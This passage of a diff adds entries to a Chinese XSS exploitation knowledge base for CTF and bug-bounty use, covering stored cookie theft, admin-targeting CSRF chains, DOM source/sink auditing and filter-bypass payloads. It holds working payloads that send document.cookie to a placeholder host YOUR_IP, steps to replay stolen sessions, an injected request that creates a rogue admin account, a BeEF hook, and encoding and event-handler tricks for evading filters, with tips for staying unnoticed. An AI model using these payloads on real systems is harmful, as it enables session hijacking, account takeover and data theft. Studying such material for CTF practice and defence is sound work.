富文本点不要恋战，白名单没过就直接换点；普通文本框往往是最好打的。"
+        },
+        {
+          "id": "stored-cookie-steal",
+          "title": "窃取 cookie 完整利用链",
+          "tags": [
+            "xss",
+            "cookie",
+            "exploit",
+            "beef"
+          ],
+          "aliases": [
+            "盗cookie"
+          ],
+          "difficulty": "medium",
+          "summary": "从注入 payload 到数据回传的完整闭环，包含外带通道与落地接收脚本。",
+          "content": "\n#### 这个条目的作用\n把\"弹个 alert\"升级成真正有收益的利用：让受害者的 cookie 悄悄发到你的服务器，你再拿 cookie 冒充受害者登录。重点是搭建完整的\"注入 → 外带 → 接收 → 重放\"闭环。\n\n#### 前置条件\n- 一个能收请求的接收端：自己的 VPS（下文 `YOUR_IP` 换成它的公网 IP），或用 Burp Collaborator / webhook.site 临时替代\n- 一个已确认可执行脚本的存储型 XSS 点（见 stored-storage-points）\n- 受害者会用同一个浏览器访问目标站点（训练时用两个浏览器或隐身窗口模拟）\n\n#### 第 1 步：先确认目标 cookie 有没有 HttpOnly\nF12 → Application → Cookies，看目标域 cookie 的 HttpOnly 列。\n- 没勾 HttpOnly → 可被 `document.cookie` 读取，走本页完整链路。\n- 勾了 HttpOnly → `document.cookie` 读不到，别在这里耗时间，转 stored-hit-admin 的 CSRF 链打法。\n> [!tip]\n> CTF 里为了教学通常不设 HttpOnly；真实站点大都会设。所以盗 cookie 前这 10 秒检查非常关键。\n\n#### 第 2 步：搭接收端\nVPS 上用一行命令起个日志服务（收到啥记啥）：\n```bash\n# Linux VPS 上执行，监听 80 端口，请求路径与参数全部写进 access.log\npython3 -m http.server 80 > access.log 2>&1 &\n# 或者用 nc 更简单\nnc -lvnp 80\n```\n不折腾 VPS 的话，用 webhook.site 或 Burp Collaborator 拿一个临时 URL 也能收参数（免费、够 CTF 用）。\n\n#### 第 3 步：选外带通道\n三种通道按优先级选：\n```javascript\n// ① 推荐：new Image()，只发一个图片请求，不跳转不弹窗，最隐蔽\nnew Image().src='http://YOUR_IP/c?u='+encodeURIComponent(location.href)+'&c='+document.cookie;\n\n// ② fetch：能带更多自定义数据，但浏览器可能因 CORS 拦截读取，请求本身仍会发出\nfetch('http://YOUR_IP/c?c='+document.cookie);\n\n// ③ 极短事件版：字段长度受限时的备用\n<img src=x onerror=\"fetch('http://YOUR_IP/c?c='+document.cookie)\">\n```\n> [!warn]\n> `document.cookie` 里可能有分号、等号等特殊字符，直接用会破坏 URL 参数格式，务必用 `encodeURIComponent` 包一层。URL 里协议写 `http://` 或 `//`（协议相对），不要写 `https`，除非接收端配了证书。\n\n#### 第 4 步：把 payload 注入存储点\n```html\n<script>\nnew Image().src='//YOUR_IP/c?u='+encodeURIComponent(location.href)+'&c='+document.cookie;\n</script>\n```\n提交到已确认的存储点（如评论区），自己先作为\"受害者\"访问渲染页验证。\n预期结果：VPS 上 `access.log` 出现一行包含当前页面 URL 和 cookie 的请求。\n如果不行：检查接收端防火墙是否放行 80 端口（`ufw status`）、payload 是否被过滤/截断、CSP 是否禁了外部请求（Network 面板看红色报错）。\n\n#### 第 5 步：用日志还原 cookie\n```txt\n2025-01-01 10:00:01 GET /c?u=https%3A%2F%2Ftarget.com%2Fadmin&c=sessionid%3Dabc123%3Btoken%3Dxyz\n```\n肉眼或脚本解码后得到：`sessionid=abc123;token=xyz`，这就是受害者身份凭证。\n\n#### 第 6 步：用 cookie 重放登录（冒充受害者）\n- 浏览器方式：F12 → Application → Cookies，逐条改成受害者的 cookie 值，刷新目标页 → 直接进入受害者登录态。\n- 请求方式：Burp Repeater 里把 `Cookie: sessionid=abc123;token=xyz` 原样塞进请求头发给后台接口。\n预期结果：看到受害者的个人数据或后台页面 → 会话劫持成立。\n> [!danger]\n> 存下 cookie 后尽快用，session 有过期时间；别在自己浏览器里长期挂着别人身份，容易误操作污染数据。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| VPS 收不到任何请求 | 端口没监听 / 防火墙挡了 / payload 未触发 | 先 `pv` 或 telnet 测端口通不通；用 Burp 看浏览器是否发出请求 |\n| cookie 值不完整 | 未 encodeURIComponent，分号截断了参数 | payload 里用 `encodeURIComponent(document.cookie)` |\n| 弹窗验证能过，盗 cookie 不触发 | 页面 CSP 禁止外部请求 | Network 面板看拦截报错；改用页面内 keylogger 或 DOM 篡改 |\n| 拿到 cookie 重放还是没权限 | HttpOnly 只挡了读取，或 session 已失效 | 检查 HttpOnly 标记；立刻重放 |\n\n#### 实战要点\n- 利用链固定五段：注入 → 外带 → 接收 → 解析 → 重放，任何一段断了整条链都不成立，逐段验证。\n- `new Image()` 优先于 `location=`：前者不发新页面、不弹窗、日志量小，管理员不易察觉。\n- cookie 有特殊字符必须 URL 编码；页面 URL 一起带出来，方便定位受害者当时在哪个页面。\n- 有 HttpOnly 时立刻换思路（CSRF 链/读取页面内容），不要硬刚。\n- CTF 交 flag 通常靠重放后的后台页面，务必跑通\"重放\"这最后一步。"
+        },
+        {
+          "id": "stored-hit-admin",
+          "title": "打管理员思路",
+          "tags": [
+            "xss",
+            "stored",
+            "admin",
+            "csrf"
+          ],
+          "aliases": [
+            "打管理员"
+          ],
+          "difficulty": "hard",
+          "summary": "存储型 XSS 的最大收益是\"守株待兔\"攻击管理员，前置条件是管理员会访问被污染页面，核心思路是把 XSS 升级成 CSRF 链路。",
+          "content": "\n#### 这个条目的作用\n说明白\"普通用户中了存储型 XSS\"和\"管理员中了\"的差距在哪，并给出把 XSS 升级成能打管理员的具体三套打法——重点是绕过 HttpOnly 的 CSRF 链思路。\n\n#### 前置条件\n- 一个已在普通用户侧验证可执行的存储型 XSS 点（stored-storage-points 的产出）\n- 确认管理员会访问含该存储点的页面（后台工单/昵称/公告列表等）\n- 两个测试账号：一个受害者、一个攻击者（CTF 里通常是题目给的）\n\n#### 第 1 步：判定三件事，决定走哪条路\n1. 管理员的 session cookie 有没有 HttpOnly → F12 看 Application → Cookies\n2. 后台管理接口和前台是否同源（同 host 同端口）→ 看请求地址\n3. 后台页面有没有 CSP / 是否渲染该存储点 → 源码看响应头\n对照下表和结论：\n| 情况 | 打法 |\n|---|---|\n| cookie 无 HttpOnly + 管理前端可访问 cookie 外带 | **直接盗 cookie**（沿用 stored-cookie-steal 的链路） |\n| HttpOnly 或想拿权限而非 session | **CSRF 链**（本页重点） |\n| 需要长期驻留、持续操作 | **BeEF/钓鱼钩子**（挂 `//YOUR_IP:3000/hook.js` 控制受害者浏览器） |\n\n#### 第 2 步：理解 CSRF 链为什么能绕过 HttpOnly\n核心一句话：**浏览器自动携带同源 cookie，fetch 后台接口根本不需要读 cookie 值**。\n```txt\n管理员登录态 (cookie 在浏览器里，HttpOnly 也照样随请求发送)\n   -> 管理员打开被污染的页面 -> payload 里的 fetch 执行\n   -> fetch('/admin/...') 是同源请求 -> 浏览器自动带上管理员 cookie\n   -> 服务端以为是管理员本人 -> 操作成功\n```\n也就是说：HttpOnly 只挡\"读\"，不挡\"用\"。payload 不需要知道 cookie 内容，替管理员发请求即可。\n\n#### 第 3 步：抓后台写接口的请求格式\n用自己账号登录后台（或看题目给的 API 文档），Burp 抓一个\"改配置/加用户\"类请求，记三样：\n- 请求方法（GET/POST/PUT）\n- URL 路径（如 `/admin/user/add`）\n- 请求体格式（JSON 还是 form）\n- 是否有 CSRF token（body 或自定义头里）\n\n#### 第 4 步：构造 CSRF 链 payload\n通用模板（JSON 接口版，创建管理员账号为例）：\n```html\n<script>\nfetch('/admin/user/add', {\n  method: 'POST',\n  headers: {'Content-Type': 'application/json'},\n  body: JSON.stringify({user: 'hacker', role: 'admin', pass: 'hack123'})\n}).then(r => r.text()).then(t => {\n  new Image().src = '//YOUR_IP/finish?r=' + encodeURIComponent(t);\n});\n</script>\n```\n根据第 3 步抓到的真实接口改 method/路径/字段名。form 接口用 `FormData` 或直接拼 body：\n```html\n<script>\nfetch('/admin/user/add', {\n  method: 'POST',\n  headers: {'Content-Type': 'application/x-www-form-urlencoded'},\n  body: 'user=hacker&role=admin&pass=hack123'\n});\n</script>\n```\n> [!warn]\n> 后台接口若带 CSRF token 校验，需要先在页面里读 token 再带上：审查页面源码找隐藏的 token 字段（如 `<meta name=\"csrf-token\">` 或表单里的 `input[name=csrf]`），fetch 前用 `document.querySelector('meta[name=csrf-token]').content` 取出来塞头里。token 在同源页面内可以随意读。\n\n#### 第 5 步：双账号自测（关键闭环验证）\n规则：A 账号当\"管理员\"（或直接用题目管理员环境），B 账号提交 payload。步骤：\n1. B 把 payload 存进存储点\n2. A 登录后访问渲染页（模拟管理员踩雷）\n3. 观察是否出现 `//YOUR_IP/finish` 请求、后台是否多出 hacker 账号\n预期结果：后台出现新管理员账号 → 链路成立。\n如果不行：检查 fetch 是否被 CSP 拦（Network 红错）；接口是不是真的同源；请求体格式是否与服务端期望一致（看响应状态码 400 还是 200）。\n\n#### 第 6 步：用新账号登录后台收尾\n拿创建的 `hacker` 账号登录后台，找 flag/敏感信息，或继续提权。\n> [!tip]\n> 打管理员前先自己注册两个账号互测，确认 payload 在\"非管理页面\"也触发，避免管理员视角页面结构不同导致 payload 失效——这是最常翻车的一步。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| fetch 跨域报错 | 后台接口与前台不同源 | 找同源的接口；或改用 form 提交（跨域表单可发） |\n| 请求发出但 400 | 请求体字段名/格式不对 | 抓包对比你自己的合法请求，逐字段对齐 |\n| 带 token 的接口 403 | CSRF token 校验 | 页面内先读 token 再带（见第 4 步 warn） |\n| CSP 拦截脚本 | 后台页 CSP 严格 | 换存储点找无 CSP 的页面；或改用纯事件型短 payload |\n| 管理员根本没访问 | 渲染页不常被管理员打开 | 优先选工单、公告、后台列表等管理员必看页面 |\n\n#### 实战要点\n- 优先级排序：无 HttpOnly 先盗 cookie；有 HttpOnly/要拿权限走 CSRF 链；要长期控制上 BeEF。\n- \"同源 fetch + 自动带 cookie\"是绕过 HttpOnly 的核心，payload 全程不需要读 cookie。\n- 触发条件核对：存储点可见于后台页 + 后台无 CSP（或允许同源）+ 写接口同源无 Origin 校验。\n- 打的是\"管理员必看页面\"，不是\"你能提交的页面\"，选点决定成败。\n- 双账号互测是最高性价比的验证手段，永远先于真实攻击。"
+        }
+      ]
+    },
+    {
+      "id": "g-dom",
+      "name": "DOM XSS",
+      "intro": "纯客户端漏洞，服务器响应里看不到 payload，审计重点在前端 JS 的 source 到 sink 数据流",
+      "entries": [
+        {
+          "id": "dom-source-sink",
+          "title": "source/sink 对照表",
+          "tags": [
+            "dom-xss",
+            "source",
+            "sink"
+          ],
+          "aliases": [
+            "DOM型漏洞点"
+          ],
+          "difficulty": "medium",
+          "summary": "DOM XSS 成立的条件是一条可控数据从 source 流入危险 sink，先建立映射表再逐条审计。",
+          "content": "\n#### 这个条目的作用\nDOM XSS 和反射/存储型的最大区别：Response 里永远看不到 payload，因为服务器根本没参与拼接。判断它必须理解\"数据从哪来（source）、流到哪去（sink）\"，本页给你一张可直接对照的映射表。\n\n#### 前置条件\n- 浏览器开发者工具（F12），会看 Network 和 Console\n- 能拿到目标站点的前端 JS（Sources 面板或 JS 文件）\n- 一个带前端路由/搜索/分享功能的靶场（很多 CTF 前端题都是 DOM XSS）\n\n#### 第 1 步：记住判定铁律\n> [!danger]\n> **响应体无 payload，但同一 payload 在浏览器内执行 = DOM XSS。**\n验证动作：注入 `?x=abc123`，Response 里搜 `abc123` 找不到 → 基本可断定走 DOM 路线，开始看前端代码。\n\n#### 第 2 步：认识常见 source（数据入口）\n```javascript\nlocation.href / location.search / location.hash   // URL 各部分，用户可控\ndocument.URL / document.referrer                   // 当前 URL、来源页 URL\ndocument.cookie / window.name                      // cookie、窗口名（可被外部页面设置）\nhistory.state                                      // 前端路由状态\npostMessage 事件数据                                // 来自其它窗口/iframe 的消息\n```\nsource 的本质：**用户能影响其内容的值**。URL 参数、hash、甚至 `window.name`（攻击者页面 `window.open` 时可指定）都是可控入口。\n\n#### 第 3 步：认识危险 sink（执行/写入点）\n```javascript\ndocument.write()               // 直接写 HTML —— 最经典\nelement.innerHTML = ...        // 解析 HTML —— 最普遍\nelement.outerHTML = ...\nelement.insertAdjacentHTML(...)\neval() / setTimeout(\"字符串\") / setInterval(\"字符串\")   // 字符串被执行\nnew Function(\"字符串\")\nlocation.href = ... / location.assign() / location.replace()  // javascript: 变体\nelement.src / element.href = ...                        // javascript: 变体\n```\nsink 的本质：**能把字符串当代码或 HTML 处理的位置**。\n\n#### 第 4 步：用浏览器控制台手动验证一条链\n不用先读代码，直接在 Console 手工构造数据流，验证\"入口可控 + 出口危险\"：\n```javascript\n// 手工模拟：把 location.hash 塞进 innerHTML，看会不会执行\nlocation.hash = '#<img src=x onerror=alert(document.domain)>';\n// 然后去页面上找一个 innerHTML 绑定 hash 的元素……没有就不成立，纯验证手法\n```\n更快的做法：改 URL 的 hash/search 参数注入 `<img src=x onerror=alert(1)>`（URL 里编码成 `%3Cimg...%3E`），刷新后看是否弹窗——弹了就是有 source→sink 链，接着去代码里找具体位置。\n\n#### 第 5 步：源码审计，反推完整数据流\n在 JS 文件里搜索 sink 关键词：\n```text\ninnerHTML  outerHTML  document.write  insertAdjacentHTML  eval(\nsetTimeout(  setInterval(  new Function(  location.href=  location.assign\npostMessage  addEventListener('message'\n```\n命中后反向追踪：这个被写入的变量赋值自哪里？逐层上溯，直到某个 source。搜到如下模式即判定：\n| Source | Sink | 典型漏洞代码 |\n|---|---|---|\n| `location.hash` | `innerHTML` | `el.innerHTML = location.hash.slice(1)` |\n| `location.search` | `document.write` | `document.write('<a href=\"'+q+'\">')` |\n| `location.hash` | `eval` | `eval(location.hash.slice(1))` |\n| `document.referrer` | `location.href` | `location.href = referrer` |\n| `postMessage` | `innerHTML` | `window.onmessage = e => el.innerHTML = e.data` |\n\n#### 第 6 步：构造最终验证 payload\n```html\n<!-- URL 中提交（hash 或 search 参数） -->\n#<img src=x onerror=alert(document.domain)>\n?q=\"><svg onload=alert(document.domain)>\n```\n根据第 5 步定位的具体拼接方式调整闭合（参考 g-basic 的闭合公式），刷新触发。\n预期结果：弹窗显示当前域名 → DOM XSS 成立。\n如果不行：eval 类 sink 里标签不生效，改用 `eval(location.hash.slice(1))` 直接注入 `alert(1)`（不带标签）；确认没有 WAF 对 URL 里的 payload 做编码。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| Response 里死活找不到 payload | 它就是 DOM XSS，别在响应里找 | 去看前端 JS 的 source→sink 链 |\n| 改了 URL 不触发 | hash/search 选错参数，或数据流另有中转 | 逐个参数试；在 sink 行打断点看变量值 |\n| 注入标签不弹窗 | sink 是 eval 而非 innerHTML | 换纯 JS payload：`alert(1)` 而不是 `<img>` |\n| 弹窗了但报错 | payload 与代码拼接冲突（引号未闭合） | 按闭合公式补 `\"` `'` `>` 和收尾注释 |\n\n#### 实战要点\n- 判定顺序固定：响应体找不到 payload → 列 source → 列 sink → 画一条可达链 → 构造 payload。\n- `location.hash` 不会被发送到服务器，抓包工具看不到它，只能靠浏览器侧验证。\n- eval/setTimeout 类 sink 和 innerHTML 类 sink 的 payload 完全不同，先分清再构造。\n- 审计关键词优先搜 `innerHTML`、`document.write`、`eval(`、`location.`、`postMessage` 五类。\n- 一条链断在哪一层（source 被截断 / 中转转义 / sink 不执行），就用哪一层的绕过（见 g-bypass）。"
+        },
+        {
+          "id": "dom-framework-pits",
+          "title": "框架渲染坑（vue/react）",
+          "tags": [
+            "dom-xss",
+            "vue",
+            "react",
+            "framework"
+          ],
+          "aliases": [
+            "v-html",
+            "dangerouslySetInnerHTML"
+          ],
+          "difficulty": "hard",
+          "summary": "现代框架默认转义文本，但显式开启\"渲染原始 HTML\"的 API 就是 DOM XSS 高危点，CTF 和 SRC 都是重灾区。",
+          "content": "\n#### 这个条目的作用\nVue/React 默认会把数据当文本转义，安全；但框架都留了\"渲染原始 HTML\"后门（v-html / dangerouslySetInnerHTML），一旦开发者把用户数据塞进去，就开出 DOM XSS。本页教你一眼认出这些坑和正确的穷举审计法。\n\n#### 前置条件\n- 能拿到前端源码或打包产物（webpack 拆包后搜关键词，见 recon-js-analysis）\n- 一个基于 Vue/React 的靶场或真实站（F12 看页面里有 `_vue_` 或 React 挂载点）\n- 会用 F12 的 Sources 全局搜索（Ctrl+Shift+F）\n\n#### 第 1 步：理解框架默认行为是\"安全的\"\n```html\n<!-- Vue：插值默认转义，安全 -->\n<div>{{ userContent }}</div>\n\n<!-- React：children 默认转义，安全 -->\n<div>{props.comment}</div>\n```\n`{{ }}` 和 `{children}` 会把 `<` 变成实体显示成文字，永远不会执行。所以**框架本身不是漏洞，绕过默认转义的 API 才是**。\n\n#### 第 2 步：认识 Vue 的头号坑 v-html\n```html\n<div v-html=\"userContent\"></div>\n```\n```html\n<!-- 等价写法，数据来自 URL 依然危险 -->\n<div v-html=\"location.hash.slice(1)\"></div>\n```\n判定链：`v-html` 的值来自接口数据（存储型/反射型）→ 前端把原始 HTML 直接插入 DOM；来自 `location.*` → 纯 DOM XSS。\n验证：URL 加 `#<img src=x onerror=alert(1)>`，刷新，Vue 会把 hash 原样当 HTML 渲染 → 弹窗。\n> [!danger]\n> `v-html` 完全跳过 Vue 的转义。`v-text` 和 `{{ }}` 是安全的，只有 `v-html` 是雷。\n\n#### 第 3 步：认识 React 的头号坑 dangerouslySetInnerHTML\n```jsx\n<div dangerouslySetInnerHTML={{ __html: props.comment }} />\n```\n与 Vue 同理：`{children}` 安全，唯独这个属性把字符串当 HTML 解析。\n```jsx\n// 危险写法\n<div dangerouslySetInnerHTML={{ __html: location.hash.slice(1) }} />\n```\n\n#### 第 4 步：清点属性绑定类次要坑\n```jsx\n// 危险：href 绑定用户输入，可塞 javascript: 伪协议\n<a href={userLink}>x</a>          // userLink=\"javascript:alert(1)\" 即触发\n\n// 危险：跳转函数接用户输入\nwindow.open(userInput)            // userInput=\"javascript:alert(1)\"\n\n// 危险：模板引擎类化写法（Angular）\n<div [innerHTML]=\"userContent\"></div>\n```\n> [!tip]\n> 属性绑定（`:href`/`href={}`）不转义 URL scheme，`javascript:` 能直接混进去；`window.open` 则与框架无关，常见于 SPA 路由跳转。这两个经常被查漏洞的人漏掉。\n\n#### 第 5 步：全库穷举检索六个关键词\n这是审计类题目性价比最高的一步。对打包产物（或源码目录）全局搜索：\n```text\nv-html              dangerouslySetInnerHTML      document.write\ninnerHTML           window.open                  location.href =\n```\n命中后对每个结果做一步判定：**写入/跳转的值，上游是否可达用户输入**（URL、接口、postMessage、存储字段）。不可达 → 无害；可达 → 漏洞，按对应 payload 验证。\n\n#### 第 6 步：不同坑用不同 payload 验证\n```html\n<!-- v-html / dangerouslySetInnerHTML / innerHTML 类 -->\n#<img src=x onerror=alert(document.domain)>\n\n<!-- href 绑定 / window.open 类 -->\njavascript:alert(document.domain)\n\n<!-- eval 类（少见但存在） -->\nalert(document.domain)\n```\n操作：把 payload 放进对应的参数/字段，刷新触发，确认后回写报告。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| `{{ }}` 里塞标签不执行 | 插值默认转义，本来就安全 | 这不是漏洞，去搜 v-html |\n| 搜 `v-html` 找到了但不触发 | 值被上游过滤/截断 | 往上游追：接口数据 → 存储点 → 提交处 |\n| 插了 `<img onerror>` 没反应 | payload 与插入上下文冲突 | 先在网页里看实际渲染结构再改闭合 |\n| `javascript:` 在 href 里不执行 | 新版 Chrome 对部分上下文收窄 | 换事件属性或检查是否有 URL 白名单前置过滤 |\n\n#### 实战要点\n- 记住三句话：`{{ }}` 安全、`{children}` 安全、`v-html`/`dangerouslySetInnerHTML` 是雷。\n- 审计固定动作：全局搜 `v-html`、`dangerouslySetInnerHTML`、`document.write`、`innerHTML`、`window.open`、`location.href =` 六个词。\n- 每个命中点只问一个问题：这个值可控吗？可控即漏洞。\n- 打包产物 minify 后关键词还在（字符串无法被压缩改名），webpack 拆包后照样能搜。\n- 框架版本换代（Vue2→3 等）不影响这些 API 的存在，坑是设计层面留下的。"
+        }
+      ]
+    },
+    {
+      "id": "g-bypass",
+      "name": "绕过技巧",
+      "intro": "过滤不是终点，编码、事件、标签变体与截断是四大绕过方向，配合使用几乎通杀常见黑名单",
+      "entries": [
+        {
+          "id": "bypass-encoding",
+          "title": "编码绕过",
+          "tags": [
+            "xss",
+            "bypass",
+            "encoding"
+          ],
+          "aliases": [
+            "实体编码",
+            "URL编码"
+          ],
+          "difficulty": "medium",
+          "summary": "浏览器在解析 HTML 时会逐层解码，利用\"服务端对码过滤、浏览器解码后执行\"的差异即可绕过一次过滤。",
+          "content": "\n#### 这个条目的作用\n过滤器的思路是\"看到危险字符/关键字就拦\"，浏览器的思路是\"遇到编码就先解码再解析\"。两边对不上，就是绕过空间。本页教你按注入上下文选对编码层，把被过滤的 payload 用编码\"骗\"过服务端、在浏览器里还原执行。\n\n#### 前置条件\n- 一个已确认有过滤的注入点（先按 basic-detect-payloads 做过字符探测）\n- 能看浏览器实际解析结果（F12 Elements 面板）\n- 理解基本闭合上下文（basic-contexts 的四类上下文）\n\n#### 第 1 步：先判定上下文——决定用哪层编码\n> [!warn]\n> 编码只在**能被浏览器解码的那个层**有效，选错层一切白搭。三问定位：\n> 1. 注入点落在标签间、属性里、还是 JS 字符串里？\n> 2. 服务端过滤的是字符（`<` `>`）还是关键字（`alert` `javascript:`）？\n> 3. 浏览器解码的顺序：HTML 解析器先解码实体，再到属性值里的 JS 解析器。\n> 结论：HTML 上下文/属性值 → 用 HTML 实体；JS 上下文 → 用 JS 转义。\n\n#### 第 2 步：背下三层编码对照表\n| 层 | 编码形式 | 示例 | 解码时机 |\n|---|---|---|---|\n| HTML 实体 | `&lt;` `&#60;` `&#x3c;` | `&#60;img&#62;` | HTML 解析器（最早） |\n| URL | `%3C` `%22` | `%3Cscript%3E` | URL 解码后进参数 |\n| JS 转义 | `\\x3c` `\\u003c` | `\\u0061lert(1)` | JS 字符串/标识符解析 |\n\n#### 第 3 步：过滤 `< >` 字符时——用 HTML 实体包住标签\n服务端把尖括号删了或转义了，但属性值本身能被实体编码：\n```html\n<!-- 过滤 < > 但放行引号属性时可以整体实体编码（HTML 解析器先还原再解析） -->\n&#60;img src=x onerror=alert(1)&#62;\n\n<!-- 更常见的半编码：只对关键字里某个字母做实体，绕过敏感词匹配 -->\n<img src=x onerror=&#97;lert(1)>\n```\n原理：`&#97;` 在属性值里被 HTML 解析器解码成 `a`，事件处理器里 JS 实际拿到的是 `alert(1)`，但服务端字符串匹配 `alert` 时看到的是 `&#97;lert`，匹配不上。\n预期结果：F12 的 Elements 面板里看到该属性被还原为 `onerror=\"alert(1)\"` 且弹窗。\n如果不行：确认注入点确实是\"属性值\"而非\"纯文本\"；如果连 `<`、`&` 都被双重转义（变成 `&amp;lt;`），说明有**双重编码**，先看后面第 6 步。\n\n#### 第 4 步：过滤 `javascript:` 关键字时——href 属性内用实体\n```html\n<!-- href 属性里，HTML 实体先被解码成 javascript:，再被识别为协议 -->\n<a href=\"jav&#x61;script:alert(1)\">x</a>\n<a href=\"&#106;avascript:alert(1)\">x</a>\n```\n操作：把它交给用户点击（或配合 `onclick` 自动触发），点击后执行。\n> [!warn]\n> 这个只在 **href/src/action 属性**（HTML 上下文）有效。同样的实体塞进**事件属性值**（JS 上下文）无效——JS 解析器不认识 HTML 实体，那里要用第 5 步的 JS 转义。\n\n#### 第 5 步：过滤 `alert` 等 JS 关键字时——JS 转义\n事件属性值是 JS 上下文，用 JS 字符串/标识符转义：\n```html\n<!-- 方案 A：函数名用 unicode 转义（JS 标识符支持 \\u 转义，直接在事件里写） -->\n<img src=x onerror=\"\\u0061lert(1)\">\n\n<!-- 方案 B：字符串内用 \\x / \\u，再交给 eval 执行（过滤 eval 时可用编码后的名字） -->\n<img src=x onerror=\"eval('\\x61lert(1)')\">\n```\n原理：方案 A 里 `\\u0061` 在 JS 解析标识符时还原成 `a`；方案 B 里 `'\\x61lert(1)'` 字符串解析完是 `'alert(1)'`，eval 再执行。\n> [!danger]\n> `\\x` 十六进制转义**不能**用于标识符（`\\x61lert(1)` 直接写在事件里是语法错误），只能出现在字符串字面量里配 eval 用；标识符位置只能用 `\\u`。两者别搞混。\n\n#### 第 6 步：URL 编码的正确打开方式\nURL 编码（`%3C`）只在\"从 URL 进参数\"这一层被解码，用于应付\"请求被中间层过滤\"，不解决服务器响应后的过滤：\n```http\nGET /search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1\n```\n> [!warn]\n> 浏览器地址栏里手动输入的 payload 会被浏览器自动 URL 编码一次，抓包软件（Burp）里再改一次，控制器里看的是解码后实体；若服务端把接收到的值**再编码一次**放进页面（双重编码），实体就变成 `&amp;lt;`，需要继续观察实际渲染再设计。判断方法：F12 Elements 看最终 DOM 里 payload 长什么样，以它为准。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 属性里实体编码不执行 | 注入点不是属性上下文/实体被双重转义 | Elements 面板看最终 DOM；确认是 `&#` 而非 `&amp;#` |\n| 事件属性里用 `&#97;lert` 不弹 | 事件属性是 JS 上下文，不认 HTML 实体 | 改成 `\\u0061lert(1)` 或配 eval 的 `\\x61` |\n| `\\x61` 直接写在事件里报语法错 | hex 转义不能用于标识符 | 换 `\\u0061`，或包进字符串再 eval |\n| 实体解码后 alert 仍被拦 | 过滤发生在解码后的 JS 执行链（少见） | 组合其他绕过层：事件变体 + 空白符 + 截断（见 g-bypass 其他条目） |\n| 怎么编码都不触发 | 上下文判定就错了 | 退回 basic-contexts 重新定上下文，再选编码层 |\n\n#### 实战要点\n- 固定的选题流程：定上下文（HTML/属性/JS）→ 看过滤对象（字符/关键字）→ 选编码层（实体/URL/JS 转义）。\n- HTML 实体用于属性与标签上下文；JS 转义用于事件/script 上下文；URL 编码只处理进参这一层。\n- `&#x61;`（十六进制）、`&#97;`（十进制）等价，都可用；过滤了 `&#` 前缀就换大小写/空白变体。\n- 观察以 **F12 Elements 还原后的 DOM** 为准，别猜服务端转了几层。\n- 编码绕过失败不要死磕一层，按 编码 → 事件 → 变体 → 截断 的顺序升级（见 g-bypass 其余条目）。"
+        },
+        {
+          "id": "bypass-events",
+          "title": "事件属性大全表",
+          "tags": [
+            "xss",
+            "bypass",
+            "events"
+          ],
+          "aliases": [
+            "事件表"
+          ],
+          "difficulty": "medium",
+          "summary": "事件属性是黑名单时代的主力绕过面：标签能换成无数变体，事件却总有一款没被过滤，且多数事件无需用户交互。",
+          "content": "\n#### 这个条目的作用\n黑名单过滤掉 `<script>`、`onerror` 等常见关键字后，事件属性仍是\"标签间与属性内两种上下文\"下最通用的执行入口。本条目给你一份**按触发性质分类的事件清单**，以及\"从零交互事件到交互事件\"的逐层替换流程，让 payload 在过滤层层加码时仍有得换。\n\n#### 前置条件\n- 已确认注入上下文：标签间（能插入新标签）还是属性内（能闭合引号）\n- 已确认过滤项：知道 `script`、`onerror`、`alert` 等哪些被拦\n- 准备一个能观察执行结果的环境：浏览器控制台、带 payload 的测试页、或靶场题目\n\n#### 第 1 步：确认上下文并选触发载体\n注入点在 HTML 标签间时，先测最基础的自动触发三件套，其中 `<img>` 的 `onerror` 只要图片加载失败（`src=x` 必然失败）就执行，不依赖任何用户操作：\n```html\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onpageshow=alert(1)>\n```\n预期结果：页面加载时弹出 `1`。如果不行，大概率是 `onerror` 或 `alert` 被过滤，进入下一步换事件。\n\n#### 第 2 步：换零交互事件（不依赖资源加载）\n`onerror` 依赖资源加载失败，图片被禁用或过滤掉 `onerror` 时换\"聚焦/切换\"类事件，它们在元素创建时自动触发：\n```html\n<input autofocus onfocus=alert(1)>\n<details open ontoggle=alert(1)>\n<marquee onstart=alert(1)>\n```\n预期结果：`<input autofocus>` 页面载入即聚焦并触发 `onfocus`；`<details open>` 默认展开触发 `ontoggle`。这两类不依赖外部资源，网络受限的靶场环境优先使用。\n\n#### 第 3 步：换事件名称变体（过滤 `onfocus` 等关键字时）\n事件名同样可以被过滤，备选同性质事件逐个替换，直到命中未被拦截的：\n```html\n<svg/onload=alert(1)>                       <!-- onload 换到 svg 上 -->\n<video><source onerror=alert(1)>            <!-- 视频源加载失败触发 -->\n<img src=x onpointerenter=alert(1)>         <!-- 现代指针事件 -->\n<img src=x onmouseover=alert(1)>            <!-- 需要悬停 -->\n```\n预期结果：任一事件名未被过滤即弹窗。注意 `onpointerenter`、`onauxclick` 等冷门事件很少在黑名单里，是真实 SRC 的常见漏网之鱼。\n\n#### 第 4 步：交互触发型兜底（诱导场景）\n以上全部被拦时，退回\"需要用户交互\"的事件，配合钓鱼文案诱导点击/悬停/按键：\n```html\n<a href=\"#\" onclick=alert(1)>点我</a>\n<div onmouseover=alert(1)>悬停我</div>\n<input onkeydown=alert(1)>\n<iframe onload=alert(1)>\n```\n预期结果：用户执行对应操作后弹窗。CTF 中交互型事件常用于\"访问即弹窗\"被禁后的第二方案，报告时应注明需要交互、危害降级。\n\n#### 第 5 步：事件属性注入（属性内上下文）\n注入点在属性值内（如 `<input value=\"INJECT\">`）时，先闭合引号再追加事件，无需闭合标签：\n```html\n\"><img src=x onerror=alert(1)>\n\" autofocus onfocus=alert(1) x=\"\n' onmouseover='alert(1)\n```\n预期结果：属性上下文下用 `\"` 或 `'` 闭合当前值，随后追加的事件属性成为该标签的一部分并触发。这是\"属性内注入\"的标准姿势，比尝试闭合整个标签更稳。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 弹窗没出现但 payload 出现在源码里 | 事件名或 alert 被过滤/编码 | 换冷门事件（onpointerenter、ontoggle）或编码绕过（见 g-bypass 编码节） |\n| onerror 